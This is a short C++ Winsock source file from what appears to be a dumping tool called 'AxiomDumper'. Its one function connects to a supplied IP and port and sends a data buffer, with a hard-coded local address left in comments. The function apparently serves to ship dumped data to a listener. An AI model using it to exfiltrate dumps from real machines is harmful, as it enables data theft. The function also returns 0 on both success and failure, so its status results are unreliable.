#include <chrono>
#include <thread>
#include <WS2tcpip.h>

#include "AxiomDumper.h"

int AXIOM_NetworkEmitter(const char *ip, int port, unsigned char *buffer, size_t bufferSize)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    int bytesSent;
    int bytesReceived;
    size_t totalBytesSent = 0;

    // Initialise Winsock
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0)
    {
        printf("[!] WSAStartup failed: %d\n", result);
        return (false);
    }

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("[!] Socket creation failed: %ld\n", WSAGetLastError());
        WSACleanup();
        return (false);
    }

    // Specify server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    //serverAddr.sin_port = htons(9001);
    inet_pton(AF_INET, ip, &serverAddr.sin_addr);
    //inet_pton(AF_INET, "192.168.1.19", &serverAddr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        printf("[!] Connection failed: %ld\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    // Send the data
    send(sock, (char *)buffer, bufferSize, 0);

    // Close the socket
    closesocket(sock);
    WSACleanup();

    return (0);
}
